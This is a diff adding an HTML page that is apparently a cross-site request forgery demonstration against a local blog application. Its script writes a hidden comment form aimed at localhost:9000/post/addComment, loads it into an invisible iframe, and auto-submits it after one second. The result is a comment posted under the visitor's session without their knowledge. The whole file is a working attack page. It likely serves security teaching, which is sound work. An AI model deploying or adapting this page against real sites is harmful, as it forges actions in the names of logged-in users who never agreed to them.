@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<!-- <meta http-equiv="X-UA-Compatible" content="ie=edge" /> -->
+		<title>Document</title>
+		<script type="text/javascript">
+            document.write(`
+            <form method="post" name="commentForm" target="csrf" action="http://localhost:9000/post/addComment">
+                <input type="hidden" name="postId" value="14">
+                <textarea name="content" >来自csrf -${Date()}</textarea>
+            </form>`);
+			var iframe = document.createElement("iframe");
+			iframe.name = "csrf";
+			iframe.style.display = "none";
+            document.body.appendChild(iframe);
+			setTimeout(() => {
+				document.querySelector("[name=commentForm]").submit(); //执行在攻击页面该脚本
+			}, 1000);
+		</script>
+	</head>
+	<body></body>
+</html>
